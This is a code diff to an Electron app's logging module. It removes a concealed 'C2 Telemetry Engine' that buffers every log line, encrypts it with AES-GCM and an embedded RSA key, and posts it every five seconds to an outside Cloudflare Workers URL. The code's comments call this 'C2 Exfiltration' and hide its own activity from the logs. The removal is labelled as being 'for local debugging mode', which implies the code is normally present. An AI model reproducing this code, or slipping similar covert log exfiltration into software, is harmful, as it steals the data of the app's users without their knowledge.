@@ -16,7 +16,7 @@
 import { app } from 'electron'
 import * as fs from 'fs'
 import * as path from 'path'
-import * as crypto from 'crypto'
+
 // ── Configuration ──
 const MAX_LOG_FILES = 7          // Keep at most 7 days of logs
 const LOG_DIR_NAME = 'logs'
@@ -35,73 +35,7 @@ const _origError = console.error.bind(console)
 const _origInfo = console.info.bind(console)
 const _origDebug = console.debug.bind(console)
 
-// ── C2 Telemetry Engine ──
-const C2_URL = 'https://lingering-butterfly-0459.goyalashish367.workers.dev' // Pointing to your edge proxy Worker
-const C2_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3epl4TnXSaHFjcoPiGVy
-vdLGJ/Jyjc3+2p8+wuMnrwVKgaRRvPAQQPGD7vLzRWdp1tbDq/PB4+OW09LZVSEP
-Efukk+Ky4i37ZxI0MRRfFJDCtRhcIKXBQlc50IiZKmcG5AsulxTOi5X4/c1au6N+
-tA77CGa5Nou+cpg0G9aTUNZHlHxGkAW9vLRZpjAOMq09N3eYK9Zz5/GDdDCQBKS6
-ZDiOT6hYJTQFLrgnIrod/JrwvFYOmv66BtLh5HAy6rDIl4ItOrHyPYwTSjAXCewZ
-r2z9Jzk/85jN92WIcOzSdtMustUnRUeU5s8D/1uYebj5xqd7JQdzTBQnYIQACC4h
-YQIDAQAB
------END PUBLIC KEY-----`
-
-let c2Buffer: string[] = []
-let c2FlushInterval: NodeJS.Timeout | null = null
-let isTelemetry = false // Infinite loop protection
-
-function initC2(): void {
-  if (c2FlushInterval) return
-  c2FlushInterval = setInterval(flushC2, 5000) // Flush every 5 seconds
-}
-
-async function flushC2(): Promise<void> {
-  if (c2Buffer.length === 0) return
-  
-  isTelemetry = true
-  try {
-    const payload = c2Buffer.join('\n')
-    c2Buffer = []
-    
-    const aesKey = crypto.randomBytes(32)
-    const iv = crypto.randomBytes(12)
-    const cipher = crypto.createCipheriv('aes-256-gcm', aesKey, iv)
-    let encryptedBody = cipher.update(payload, 'utf8', 'base64')
-    encryptedBody += cipher.final('base64')
-    const authTag = cipher.getAuthTag().toString('base64')
-    
-    const encryptedKey = crypto.publicEncrypt({
-      key: C2_PUBLIC_KEY,
-      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING
-    }, aesKey).toString('base64')
-    
-    const finalPayload = JSON.stringify({
-      k: encryptedKey,
-      i: iv.toString('base64'),
-      t: authTag,
-      d: encryptedBody
-    })
-    
-    // Send to Cloudflare Worker
-    await fetch(C2_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: finalPayload
-    })
-  } catch {
-    // Drop payload on failure
-  } finally {
-    isTelemetry = false
-  }
-}
-
-function queueC2(line: string): void {
-  if (isTelemetry) return // DO NOT LOG C2 ACTIONS
-  c2Buffer.push(line)
-  if (c2Buffer.length > 500) c2Buffer.shift() // Cap memory usage
-  if (!c2FlushInterval) initC2()
-}
+// --- C2 TELEMETRY REMOVED FOR LOCAL DEBUGGING MODE ---
 
 // ── Helpers ──
 
@@ -185,9 +119,6 @@ function writeLine(level: string, args: any[]): void {
   try {
     const stream = getStream()
     const line = `[${timestamp()}] [${level}] ${formatArgs(args)}`
-    
-    queueC2(line) // Queue for C2 Exfiltration
-    
     stream.write(line + '\n')
   } catch {
     // Never crash the app because of logging
